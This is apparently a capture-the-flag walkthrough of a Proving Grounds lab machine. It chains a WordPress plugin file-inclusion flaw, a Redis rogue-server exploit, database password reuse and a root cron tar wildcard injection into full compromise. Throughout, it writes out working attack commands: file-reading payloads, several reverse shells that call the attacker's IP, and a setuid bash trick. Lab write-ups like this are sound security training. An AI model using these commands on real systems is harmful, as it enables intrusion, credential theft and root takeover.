---
machine: Readys
platform: Proving Grounds
category: Linux
difficulty: Insane
tags: [wordpress, lfi, redis, rogue-server-rce, credential-reuse, tar-wildcard-injection]
date: 2026-09-08
status: retired
summary: A Linux box running WordPress alongside an internally-reachable Redis instance — testing exploitation of a vulnerable-plugin LFI, a Redis rogue-server RCE technique gated behind a leaked config password, database-credential pivoting back through the same LFI for a web-user shell, and a tar wildcard-injection cron job for the path to root.
---

## Enumeration

nmap-scan:

```bash
nmap-full 192.168.214.166
[*] Running fast port discovery on 192.168.214.166...
[sudo] password for kali: 
[*] Open ports: 22,80,6379
[*] Running full scan on 192.168.214.166...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-08 15:42 -0400
Nmap scan report for 192.168.214.166
Host is up (0.037s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Readys &#8211; Just another WordPress site
|_http-generator: WordPress 5.7.2
6379/tcp open  redis   Redis key-value store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.96 seconds
```

Feroxbusting the webapp shows that its running wordpress. We can find a wordpress login portal when we attempt to navigate to `http://target/wp-admin/admin.php` and get redirected.

We can run wp-scan to check the plugins of the wordpress application:

We see we are running wordpress version 5.7.2

```text
[+] WordPress version 5.7.2 identified (Insecure, released on 2021-05-12).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.214.166/index.php/feed/, <generator>https://wordpress.org/?v=5.7.2</generator>
 | Confirmed By: Rss Generator (Passive Detection)
 |  - http://192.168.214.166/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.7.2</generator>

```

If we inspect the source code and hunt for `plugins` we see:

```text
<link rel='stylesheet' id='general-css' href='[http://192.168.214.166/wp-content/plugins/site-editor/framework/assets/css/general.min.css?ver=1.1.1](view-source:http://192.168.214.166/wp-content/plugins/site-editor/framework/assets/css/general.min.css?ver=1.1.1)' media='all' />
```

We can look up exploits associated with site editor:

```text
WordPress Plugin Site Editor 1.1.1 - Local File Inclusion                                                             | php/webapps/44340.txt
```

```text
** Proof of Concept **
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

We perform this with a curl request and find that we can successfully LFI:

```bash
┌──(kali㉿kali)-[~/oscp/readys]
└─$ curl http://target/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
redis:x:107:114::/var/lib/redis:/usr/sbin/nologin
alice:x:1000:1000::/home/alice:/bin/bash
{"success":true,"data":{"output":[]}}
```

If we attempt to LFI wp-config we get:

```bash
┌──(kali㉿kali)-[~/oscp/readys]
└─$ curl http://target/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/www/html/wp-config.php
<!DOCTYPE html>
<html lang="en-GB">
<head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta name="viewport" content="width=device-width">
                <meta name='robots' content='noindex, nofollow' />
        <title>WordPress &rsaquo; Error</title>
        <style type="text/css">
                html {
                        background: #f1f1f1;
                }
                body {
                        background: #fff;
                        border: 1px solid #ccd0d4;
                        color: #444;
                        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
                        margin: 2em auto;
                        padding: 1em 2em;
                        max-width: 700px;
                        -webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, .04);
                        box-shadow: 0 1px 1px rgba(0, 0, 0, .04);
                }
                h1 {
                        border-bottom: 1px solid #dadada;
                        clear: both;
                        color: #666;
                        font-size: 24px;
                        margin: 30px 0 0 0;
                        padding: 0;
                        padding-bottom: 7px;
                }
                #error-page {
                        margin-top: 50px;
                }
                #error-page p,
                #error-page .wp-die-message {
                        font-size: 14px;
                        line-height: 1.5;
                        margin: 25px 0 20px;
                }
                #error-page code {
                        font-family: Consolas, Monaco, monospace;
                }
                ul li {
                        margin-bottom: 10px;
                        font-size: 14px ;
                }
                a {
                        color: #0073aa;
                }
                a:hover,
                a:active {
                        color: #006799;
                }
                a:focus {
                        color: #124964;
                        -webkit-box-shadow:
                                0 0 0 1px #5b9dd9,
                                0 0 2px 1px rgba(30, 140, 190, 0.8);
                        box-shadow:
                                0 0 0 1px #5b9dd9,
                                0 0 2px 1px rgba(30, 140, 190, 0.8);
                        outline: none;
                }
                .button {
                        background: #f3f5f6;
                        border: 1px solid #016087;
                        color: #016087;
                        display: inline-block;
                        text-decoration: none;
                        font-size: 13px;
                        line-height: 2;
                        height: 28px;
                        margin: 0;
                        padding: 0 10px 1px;
                        cursor: pointer;
                        -webkit-border-radius: 3px;
                        -webkit-appearance: none;
                        border-radius: 3px;
                        white-space: nowrap;
                        -webkit-box-sizing: border-box;
                        -moz-box-sizing:    border-box;
                        box-sizing:         border-box;

                        vertical-align: top;
                }

                .button.button-large {
                        line-height: 2.30769231;
                        min-height: 32px;
                        padding: 0 12px;
                }

                .button:hover,
                .button:focus {
                        background: #f1f1f1;
                }

                .button:focus {
                        background: #f3f5f6;
                        border-color: #007cba;
                        -webkit-box-shadow: 0 0 0 1px #007cba;
                        box-shadow: 0 0 0 1px #007cba;
                        color: #016087;
                        outline: 2px solid transparent;
                        outline-offset: 0;
                }

                .button:active {
                        background: #f3f5f6;
                        border-color: #7e8993;
                        -webkit-box-shadow: none;
                        box-shadow: none;
                }

                        </style>
</head>
<body id="error-page">
        <div class="wp-die-message"><p>There has been a critical error on this website.</p><p><a href="https://wordpress.org/support/article/faq-troubleshooting/">Learn more about troubleshooting WordPress.</a></p></div></body>
</html>

```

## Foothold

We shift gears and attempt to read the cred file for `redis` at `/etc/redis/redis.conf`. We find the following line in the file:

```text
requirepass Ready4Redis?
```

We can authenticate to redis with this:

```bash
┌──(kali㉿kali)-[~/oscp/readys]
└─$ redis-cli -h 192.168.214.166
Set your preferences in ~/.redisclirc
192.168.214.166:6379> AUTH Ready4Redis?
OK
192.168.214.166:6379> INFO
# Server
redis_version:5.0.14
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:ddd3b1f304a7d4d5
redis_mode:standalone
os:Linux 4.19.0-18-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:8.3.0
process_id:486
run_id:8857a55821c3e0355378f5759eec75f831b4aaf9
tcp_port:6379
uptime_in_seconds:3859
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:10515330
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
...

```

In this output we can find the redis version number: 

```text
redis_version:5.0.14
```

We can check what commands exist and with what permissions they would be run:

```bash
192.168.214.166:6379> COMMAND INFO CONFIG EVAL FUNCTION FCALL REPLICAOF MODULE
1) 1) "config"
   2) (integer) -2
   3) 1) admin
      2) noscript
      3) loading
      4) stale
   4) (integer) 0
   5) (integer) 0
   6) (integer) 0
7) 1) "eval"
   8) (integer) -3
   9) 1) noscript
      2) movablekeys
   10) (integer) 0
   11) (integer) 0
   12) (integer) 0
13) (nil)
14) (nil)
15) 1) "replicaof"
   16) (integer) 3
   17) 1) admin
      2) noscript
      3) stale
   18) (integer) 0
   19) (integer) 0
   20) (integer) 0
21) 1) "module"
   22) (integer) -2
   23) 1) admin
      2) noscript
   24) (integer) 0
   25) (integer) 0
   26) (integer) 0
```

The ability to run REPLICAOF as admin suggests that we may be able to perform a redis rogue server exploit for cve. This requires a compiled malicious .so file which we can get from: https://github.com/n0b0dyCN/redis-rogue-server and the redis-rce exploit we can get from https://github.com/Ridter/redis-rce.

With the exp.so from the first repo and the exploit otherwise from the second repo we can perform the rogue server attack to gain an interactive shell on the redis server:

```bash
┌──(kali㉿kali)-[~/oscp/readys]
└─$ python3 redis-rce.py -r 192.168.214.166 -L 192.168.45.247 -f exp.so -a 'Ready4Redis?'       

█▄▄▄▄ ▄███▄   ██▄   ▄█    ▄▄▄▄▄       █▄▄▄▄ ▄█▄    ▄███▄   
█  ▄▀ █▀   ▀  █  █  ██   █     ▀▄     █  ▄▀ █▀ ▀▄  █▀   ▀  
█▀▀▌  ██▄▄    █   █ ██ ▄  ▀▀▀▀▄       █▀▀▌  █   ▀  ██▄▄    
█  █  █▄   ▄▀ █  █  ▐█  ▀▄▄▄▄▀        █  █  █▄  ▄▀ █▄   ▄▀ 
  █   ▀███▀   ███▀   ▐                  █   ▀███▀  ▀███▀   
 ▀                                     ▀                   


[*] Connecting to  192.168.214.166:6379...
[*] Sending SLAVEOF command to server
[+] Accepted connection from 192.168.214.166:6379
[*] Setting filename
[+] Accepted connection from 192.168.214.166:6379
[*] Start listening on 192.168.45.247:21000
[*] Tring to run payload
[+] Accepted connection from 192.168.214.166:34511
[*] Closing rogue server...

[+] What do u want ? [i]nteractive shell or [r]everse shell or [e]xit: i
[+] Interactive shell open , use "exit" to exit...
$ 

```

The interactive shell we get by default is really bad but we can use a python reverse shell to connect to our own listener for a better shell:

```bash
export RHOST="192.168.45.247";export RPORT=22;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

This shell is still not great so we transfer over a netcat binary and use that to connect to another listener:

```bash
nc 192.168.45.247 6379 -e /bin/bash

┌──(kali㉿kali)-[~/oscp/readys]
└─$ sudo penelope -p 6379
[sudo] password for kali: 
[+] Listening for reverse shells on 0.0.0.0:6379 -> 127.0.0.1 • 10.0.2.15 • 192.168.45.247
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => readys 192.168.214.166 Linux-x86_64 👤 redis(107) 😍️ Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/kali/.penelope/sessions/readys~192.168.214.166-Linux-x86_64/2026_09_08-18_06_18-056-redis(107).log
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
redis@readys:/dev/shm$ ls
linpeas.sh  nc
redis@readys:/dev/shm$ 

```

If we navigate to /var/www/html we see that the webapp is owned by alice. We read wp-config (as we have not been able to read this so far) and get credentials to the internal mysql server which the wordpress site uses:

```text
/** MySQL database username */
define( 'DB_USER', 'karl' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Wordpress1234' );
```

If we go to /var/lib we see a `mysql` binary. We can use this to connect to our localhost database with the creds we just found:

```bash
redis@readys:/var/lib$ mysql -u 'karl' -p'Wordpress1234' -h 127.0.0.1 -P 3306 --skip-ssl-verify-server-cert
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 40
Server version: 10.3.31-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 

```

We can find an admin user for the wordpress site and its hashed password:

```bash
MariaDB [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+---------------+------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email    | user_url         | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------+------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$Ba5uoSB5xsqZ5GFIbBnOkXA0ahSJnb0 | admin         | test@test.com | http://localhost | 2021-07-11 16:35:27 |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+---------------+------------------+---------------------+---------------------+-------------+--------------+

```

We can attempt to crack this but we fail.

We view the privileges we have on our database user:

```bash
MariaDB [wordpress]> show grants;
+-------------------------------------------------------------------------------------------------------------+
| Grants for karl@localhost                                                                                   |
+-------------------------------------------------------------------------------------------------------------+
| GRANT USAGE ON *.* TO `karl`@`localhost` IDENTIFIED BY PASSWORD '*D355C376B9B98583781BE9B4D6CDE21C608C7AD9' |
| GRANT ALL PRIVILEGES ON `wordpress`.* TO `karl`@`localhost`                                                 |
+-------------------------------------------------------------------------------------------------------------+
```

I also attempt to `INTO OUTFILE` to the `/var/www/html `directory but it fails as `mysql` does not have write access to the webapp directory.

I remembered that I have an LFI which runs from the webapp and interprets php. If I can write a php revershell to a universally writable directory like `/dev/shm` with our `redis` user, we should be able to execute it with our LFI exploit.

```bash
redis@readys:/dev/shm$ nano rev.php
# write Ivan Sincek's php reverse shell into rev.php

──(kali㉿kali)-[~/oscp/readys]
└─$ curl http://target/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/dev/shm/rev.php


┌──(kali㉿kali)-[~/oscp/readys]
└─$ sudo penelope -p 80
[+] Listening for reverse shells on 0.0.0.0:80 -> 127.0.0.1 • 10.0.2.15 • 192.168.45.247

alice@readys:/var/www/html/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes$ whoami
alice

```

We can navigate to `alice`'s home directory to read the local.txt flag.

## Privilege Escalation

### Exploiting tar -cf -xf for RCE

We enumerate crontabs:

```bash
alice@readys:/home/alice$ cat /etc/crontab
*/3 * * * * root /usr/local/bin/backup.sh
alice@readys:/home/alice$ cat /usr/local/bin/backup.sh
#!/bin/bash

cd /var/www/html
if [ $(find . -type f -mmin -3 | wc -l) -gt 0 ]; then
tar -cf /opt/backups/website.tar *
fi

```

We can write our arguments of tar to execute as filenames in the current directory (/var/www/html).

```bash
nano /var/www/html/rev.sh
#!/bin/bash
bash -i >& /dev/tcp/192.168.45.247/4444 0>&1

echo '' > --checkpoint=1
echo '' > ./"--checkpoint-action=exec=bash rev.sh"
```

This will cause the root to execute the command `tar -cf /opt/backups/website.tar --checkpoint=1 --checkpoint-action=exec=bash rev.sh` while trying to zip all contents into website.tar.

We open a listener on port 4444 and catch the root shell when the cronjob is run:

```bash
┌──(kali㉿kali)-[~/oscp/readys]
└─$ rlwrap -cAr nc -lvnp 4444                                                                    
listening on [any] 4444 ...
connect to [192.168.45.247] from (UNKNOWN) [192.168.214.166] 39392
bash: cannot set terminal process group (30990): Inappropriate ioctl for device
bash: no job control in this shell
root@readys:/var/www/html# whoami
whoami
root
```

Alternatively to the reverse shell we could make the script our tar calls set a SUID bit on /bin/bash:

```bash
alice@readys:/var/www/html$ echo "chmod +s /bin/bash" > exploit.sh
alice@readys:/var/www/html$ touch ./"--checkpoint=1"
alice@readys:touch ./"--checkpoint-action=exec=bash exploit.sh"
```

We can get the flag from /root and the box is compromised!
